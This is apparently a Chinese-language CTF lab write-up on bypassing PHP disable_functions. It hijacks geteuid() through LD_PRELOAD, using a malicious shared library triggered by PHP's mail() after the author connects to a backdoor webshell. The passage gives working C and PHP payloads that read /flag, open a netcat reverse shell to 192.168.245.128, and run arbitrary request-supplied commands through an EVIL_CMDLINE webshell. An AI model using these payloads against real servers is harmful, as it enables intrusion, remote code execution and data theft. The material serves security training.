# 程序的链接
- 静态链接
  在**编译时**（compile-time）就将程序所需的所有外部库函数代码**完整地复制**到最终的可执行文件中。
- 装入时动态链接
  在**程序加载到内存时**（load-time）由操作系统的加载器完成链接。
- 运行时动态链接
  在**程序运行过程中**由程序自身主动加载和链接库。
# LD_PRELOAD绕过
`LD_PRELOAD` 是 Linux/Unix 系统的一个环境变量。它可以让你在程序运行前，优先加载你自定义的动态链接库（.so 文件）。这意味着，你可以“劫持”程序对某些标准库函数的调用，让程序去执行你自定义的代码。
**适用场景**
禁用了大量可能用到的命令执行函数

可以利用的常用函数:
- mail             内嵌在php中
- imagick       需要拓展安装

绕过条件
- 你必须能将恶意编译的 `.so` 文件放置到目标服务器的文件系统中。
- `LD_PRELOAD` 只对**动态链接**的程序有效。
- 你必须能够设置 `LD_PRELOAD` 环境变量。
- 这是最基本的前提。你必须有办法在目标系统上执行任意命令。
	- **直接设置**：`LD_PRELOAD=/tmp/exploit.so /usr/bin/id`
	- **通过 Export**：```export LD_PRELOAD=/tmp/exploit.so
/usr/bin/id```
	- **在编程语言中设置**：<?php
						putenv("LD_PRELOAD=/tmp/exploit.so");
						system("/usr/bin/id");
						?>

# **例题:**
打开网站http://192.168.245.128:18081/class02/2.php
查看源码![](./img/Pasted%20image%2020251024143453.png)
	可以发现这是一个后面，连接密码是cmd
蚁剑连接成功![](./img/Pasted%20image%2020251024143319.png)
![](./img/Pasted%20image%2020251024144012.png)
	蚁剑中执行系统命令失败，无法获取flag
查看phpinfo信息![](./img/Pasted%20image%2020251024143634.png)
	禁用了能接触到的几乎所有函数
![](./img/Pasted%20image%2020251024143807.png)
	mail函数可用
**LD_PRELOAD方法绕过**
mail函数--》调用子程序/usr/sbin/sendmail--》调用动态链接库geteuid函数
给geteuid函数重新赋值
构造payload:
```gcc
//demo.c
#include<stdlib.h>
#include<stdio.h>
#include<string.h>

void payload(){
	system("echo 'hello world!'");
	system("cat /flag > /tmp/flag");// 核心攻击代码
}
int geteuid(){
	unsetenv("LD_PRELOAD");// 清除痕迹，避免循环加载
	payload();// 执行恶意代码
	return 0;
}
```
- 劫持 `geteuid()` 函数（`sendmail` 会调用的函数）
- 在目标程序的上下文中执行系统命令

在自己的kail中编译这个文件`gcc -shared -fPIC demo.c -o demo.so`将C源代码编译成一个**动态链接库（共享库）**
- **`gcc`**: GNU C编译器
- **`-shared`**: 告诉编译器生成一个**共享库**（动态链接库），而不是可执行文件
- **`-fPIC`**: 生成**位置无关代码**(Position Independent Code)，这是共享库必需的
- **`demo.c`**: 输入的C源文件
- **`-o demo.so`**: 指定输出文件名为 `demo.so`
```php
// demo.php
<?php
putenv("LD_PRELOAD=./demo.so");// 设置环境变量，预加载恶意库
mail('','','','');             // 触发外部程序执行
?>
```
- `LD_PRELOAD` 环境变量让系统在运行任何程序前先加载指定的共享库
- `mail()` 函数在 PHP 中会调用系统的 `/usr/sbin/sendmail` 程序
- 当 `sendmail` 启动时，会加载我们恶意的 `demo.so`

上传demo.php与demo.so![](./img/Pasted%20image%2020251024151118.png)
tmp目录下生成了flag文件执行成功
![](./img/Pasted%20image%2020251024151540.png)

**改进为反弹shell**
更改脚本
```gcc
#include<stdlib.h>
#include<stdio.h>
#include<string.h>

void payload(){
	system('nc 192.168.245.128 7777 -e /bin/bash');// 核心攻击代码
}
int geteuid(){
	unsetenv("LD_PRELOAD");// 清除痕迹，避免循环加载
	payload();// 执行恶意代码
	return 0;
}
```
`gcc -shared -fPIC demo.c -o demo1.so`
```php
// demo.php
<?php
putenv("LD_PRELOAD=./demo1.so");// 设置环境变量，预加载恶意库
mail('','','','');             // 触发外部程序执行
?>
```
一旦web访问demo1.php后
kail打开监听
![](./img/Pasted%20image%2020251024153022.png)
	成功执行命令

# EVIL_CMDLINE绕过
```gcc
// EVIL_CMDLINE.c
#include<stdlib.h>
#include<stdio.h>
#include<string.h>

int geteuid(){
	const char* cmdline=getenv("EVIL_CMDLINE");
	if(getenv("LD_PRELOAD")==NULL){
		return 0;
	}
	unsetenv("LD_PRELOAD");
	system(cmdline);
}
```

`gcc -shared -fPIC EVIL_CMDLINE.c -o EVIL_CMDLINE.so`

```php
# evil_cmdline.php
<?php
$cmd = $_REQUEST["cmd"];
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";

echo "<br /><b>原始命令:</b> " . $cmd;
echo "<br /><b>输出路径:</b> " . $out_path;
echo "<br /><b>完整命令:</b> " . $evil_cmdline;

putenv("EVIL_CMDLINE=" . $evil_cmdline);
$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=" . $so_path);

echo "<br /><b>环境变量设置:</b> LD_PRELOAD=" . $so_path;

// 执行前检查
if (!file_exists($so_path)) {
    echo "<br /><b>错误:</b> 共享库不存在: " . $so_path;
}

mail("","","","");

// 检查输出文件
if (file_exists($out_path)) {
    echo "<br /><b>输出内容:</b><br />" . nl2br(file_get_contents($out_path));
} else {
    echo "<br /><b>错误:</b> 输出文件不存在，命令可能执行失败";
    // 检查目录权限
    $dir = dirname($out_path);
    if (!is_writable($dir)) {
        echo "<br /><b>目录不可写:</b> " . $dir;
    }
}
?>
```

通过web访问
/EVIL_CMDLINE.php?cmd=ls&outpath=/tmp/benben&sopath=./EVIL_CMDLINE.so
![](./img/Pasted%20image%2020251024201307.png)

执行ls成功

# 蚁剑工具绕过disable_functions
当连接上后们无法执行命令时
![](./img/Pasted%20image%2020251025175913.png)
![](./img/Pasted%20image%2020251025175950.png)
	根据模式不同选择正确的访问方式即可
![](./img/Pasted%20image%2020251025180046.png)